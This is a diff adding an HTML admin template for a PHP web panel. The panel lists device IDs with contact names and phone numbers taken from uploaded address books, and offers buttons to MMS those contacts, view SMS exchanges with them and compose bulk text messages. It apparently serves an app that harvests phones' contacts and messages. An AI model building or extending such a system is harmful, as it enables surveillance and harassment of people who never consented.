@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>layui</title>
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link rel="stylesheet" href="__PUBLIC__/layui/css/layui.css"  media="all">
+  <link rel="stylesheet" href="__PUBLIC__/font-awesome/css/font-awesome.min.css" media="all" />
+  <link rel="stylesheet" href="__CSS__/admin.css"  media="all">
+  
+  <script src="__PUBLIC__/fang/js/jquery.min.js"></script>
+  
+  
+  
+   <link href="__PUBLIC__/fang/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="__PUBLIC__/fang/css/azzara.min.css" rel="stylesheet" />
+  
+  
+  
+  
+  
+  <style type="text/css">
+/* tooltip */
+#tooltip{
+  position:absolute;
+  border:1px solid #ccc;
+  background:#333;
+  padding:2px;
+  display:none;
+  color:#fff;
+}
+td{
+    font-size: 14px !important;
+}
+.txl{
+    border: none!important;
+    text-decoration: none!important;
+    background: -webkit-linear-gradient(45deg, #42e695, #3bb2b8)!important;
+    border-radius: 7px!important;
+    color: #fff!important;
+    height: 30px!important;
+    line-height: 30px!important;
+    font-size: 12px!important;
+    padding: 0 15px!important;
+}
+.tcl{
+    border: none!important;
+    text-decoration: none!important;
+    background: -webkit-linear-gradient(45deg, #f54ea2, #ff7676)!important;
+    border-radius: 7px!important;
+    color: #fff!important;
+    height: 30px!important;
+    line-height: 30px!important;
+     font-size: 12px!important;
+     padding: 0 15px!important;
+}
+.tal{
+    border: none!important;
+    text-decoration: none!important;
+    background: -webkit-linear-gradient(45deg, #4298ff, #1473e6)!important;
+    border-radius: 7px!important;
+    color: #fff!important;
+    height: 30px!important;
+    line-height: 30px!important;
+     font-size: 12px!important;
+     padding: 0 15px!important;
+}
+.layui-table[lay-size=sm] th{
+    font-weight: 600;
+    font-size: 14px!important;
+}
+.layui-table td, .layui-table th, .layui-table-fixed-r, .layui-table-header, .layui-table-page, .layui-table-tips-main, .layui-table-tool, .layui-table-view, .layui-table[lay-skin=line], .layui-table[lay-skin=row]{
+        border-width: 0;
+}
+#layui-layer1{
+    top: 25%;
+    left: 30%;
+    width: 40%;
+    
+}
+.layui-layer-input{
+     width: 90%!important;
+     height: 60px!important;
+}
+.layui-layer-btn{
+    padding: 0 30px 10px!important;
+}
+</style>
+</head>
+<body style="padding:10px;">
+  <div class="tplay-body-div">
+      
+      
+          <div class="layui-tab">
+      <ul class="layui-tab-title">
+        <li class="layui-this">结果显示选择</li>
+      </ul>
+    </div> 
+    <form id="formsubmit" action="{:url('huaxialianmeng2022/appv1/mobile')}" method="post">
+    
+                <label style="display: flex;align-items: baseline;"> 显示
+                <select onchange="formsubmit()" name="tiaoshu" style="padding: 0.25rem 0.5rem!important;font-size: .875rem!important; line-height: 1.5;">
+                    
+                    <option {if $tiaoshu == 20}selected{/if} value="20">20条</option>
+                    <option {if $tiaoshu == 100}selected{/if} value="100">100条</option>
+                    <option {if $tiaoshu == 1000}selected{/if} value="1000">1000条</option>
+                    <option {if $tiaoshu == 5000}selected{/if} value="5000">5000条</option>
+                    
+                    </select>项结果
+                    </label>
+                  {if $id > 0}
+                 <input type="hidden" name="id" value="{$id}" />
+                 {/if}
+           </form>         
+        <script>
+            function formsubmit(){
+                $("#formsubmit").submit();
+            }
+        </script>
+      
+      
+      
+      
+      
+      
+      
+    <!--<div class="layui-tab">-->
+    <!--  <ul class="layui-tab-title">-->
+    <!--    <li class="layui-this">通讯录查看管理</li>-->
+    <!--  </ul>-->
+    <!--</div> -->
+    <!--<form class="layui-form serch" action="{:url('admin/appv1/mobile')}" method="post">-->
+    <!--    <div class="layui-form-item" style="float: left;">-->
+    <!--      <div class="layui-input-inline">-->
+    <!--        <input type="text" name="keywords" lay-verify="title" autocomplete="off" placeholder="请输入登录手机" class="layui-input layui-btn-sm">-->
+    <!--      </div>-->
+    <!--      <div class="layui-input-inline">-->
+    <!--        <input type="text" name="code" lay-verify="title" autocomplete="off" placeholder="请输入邀请码" class="layui-input layui-btn-sm">-->
+    <!--      </div>          -->
+    <!--      <div class="layui-input-inline">-->
+    <!--        <div class="layui-inline">-->
+    <!--          <div class="layui-input-inline">-->
+    <!--            <input type="text" class="layui-input" id="create_time" placeholder="通讯录上传时间" name="create_time">-->
+    <!--          </div>-->
+    <!--        </div>-->
+    <!--      </div>-->
+    <!--      <button class="layui-btn layui-btn-danger layui-btn-sm" lay-submit="" lay-filter="serch">立即提交</button>-->
+    <!--    </div>-->
+    <!--  </form> -->
+    <table id="shop-datatables" class="display table table-striped table-hover dataTable no-footer" role="grid" aria-describedby="shop-datatables_info">
+      <colgroup>
+        <col width="100">
+        <col width="200">
+        <!--<col width="40">-->
+        <!--<col width="40">-->
+        <col width="200">
+        <col width="200">
+        <!--<col width="100">        -->
+        <col width="300">
+      </colgroup>
+      <thead>
+        <tr>
+          <th style="border-bottom: 1px solid #000;">ID</th>
+          <th style="border-bottom: 1px solid #000;">设备名称</th>
+          <!--<th style="border-bottom: 1px solid #000;">登录手机</th>-->
+          <!--<th style="border-bottom: 1px solid #000;">邀请码</th>          -->
+		  <th style="border-bottom: 1px solid #000;">通讯录姓名</th>
+		  <th style="border-bottom: 1px solid #000;">通讯录号码</th>
+          <!--<th style="border-bottom: 1px solid #000;">最后上传时间</th>-->
+          <th style="border-bottom: 1px solid #000;">操作</th>
+        </tr> 
+      </thead>
+      <tbody>
+        {volist name="info" id="vo"}
+        <tr>
+          <td>{$vo.id}</td>
+          <td>{$vo.clientid}</td>          
+          <!--<td>{$vo.name}</td>-->
+          <!--<td>{$vo.code}</td>-->
+          <td>{$vo.username}</td>          
+          <td>{$vo.umobile}</td>		  
+          <!--<td>{$vo.addtime|date="Y-m-d H:i:s",###}</td>-->
+          <td class="operation-menu">
+            <div class="layui-btn-group">
+              <a class="btn-success btn" style=" color:#fff;">发送彩信</a>
+              <a class="btn-success btn"  href="{:url('appv1/sms',['smstel'=>$vo.umobile])}" title="短信来往" alt="通讯录号码短信来往" style="margin-left: 10px!important;">短信来往</a></a>              
+              <a class="btn-danger btn delete" id="{$vo.id}" title="删除数据" alt="删除数据" style="margin-left: 10px!important; color:#fff;">删除</a>
+            </div>
+          </td>
+        </tr>
+        {/volist}
+      </tbody>
+    </table>
+    
+    
+    
+    
+    <div class="row">
+              <div style="display: flex;align-items: center;" class="col-sm-12 col-md-3">
+                <div style="padding: 0;" class="dataTables_info" id="shop-datatables_info" role="status" aria-live="polite">显示{$tiaoshu}项结果,共{$adminnum}项</div>
+              </div>
+              <div class="col-sm-12 col-md-9">
+                <div class="dataTables_paginate paging_simple_numbers" id="shop-datatables_paginate">
+                  {$admin->render()}
+                </div>
+              </div>
+            </div>
+
+    {include file="public/foot"}
+    
+    <script type="text/javascript">
+    $('.delete').click(function(){
+      var id = $(this).attr('id');
+      layer.confirm('确定要删除此条数据？（注：删除后不可恢复）', function(index) {
+          
+          
+          
+          layer.open({
+    	title: '请输入二级密码',
+    	area: ['300px', '240px'],
+    	btnAlign: 'c',
+    	closeBtn:'1',//右上角的关闭
+    	content: `<div><p>注意:若要删除此信息请输入公司管理二级密码</p><input name="number" id="remark" style="width:100%;height:30px;"/></div>`,
+    	btn:['确认','取消'],
+    	yes: function (index, layero) {
+    	var value1 = $('#remark').val();//获取多行文本框的值
+    	
+    	if(value1 == ''){
+    	    layer.alert('请填写密码', {
+                icon: 5,
+                title: "提示"
+            });
+          
+   
+    	}else{
+    	 $.ajax({
+          url:"{:url('huaxialianmeng2022/appv1/mobdelete')}",
+          data:{id:id,value1:value1},
+          success:function(res) {
+            layer.msg(res.msg);
+            if(res.code == 1) {
+              setTimeout(function(){
+                location.href = res.url;
+              },1500)
+            }
+          }
+        })
+    	}
+    	
+    }
+    
+    });
+          
+          
+          
+      
+        
+        
+        
+        
+        
+        
+        
+        
+        
+      })
+    })
+    </script>
+    
+    <script type="text/javascript">
+      layui.use('layer', function(){
+        var layer = layui.layer;
+        var phone;
+        $('.tishikuang').click(function(){
+          layer.prompt({
+            formType: 0,
+            value: '',
+            title: '请编辑短信内容'
+          }, function(value, index, elem){
+            phone = value;
+            layer.msg('短信正在匹配线路，五分钟内可撤回。定好线路五分钟后不可撤回 ');
+             layer.close(index);
+            // if(email = null) {
+            //   layer.msg('收件箱不能为空');
+            //   return false;
+            // }
+            // $.ajax({
+            //   url:"/admin/smsconfig/smsto.shtml"
+            //   ,type:'post'
+            //   ,data:{phone:phone}
+            //   ,success:function(res) {
+            //     layer.msg(res.msg);
+            //     if(res.code == 1) {
+            //       layer.close(index);
+            //     }
+            //   }
+            // })
+          });
+          return false;
+        })
+      });              
+    </script>
+  </div>
+</body>
+</html>
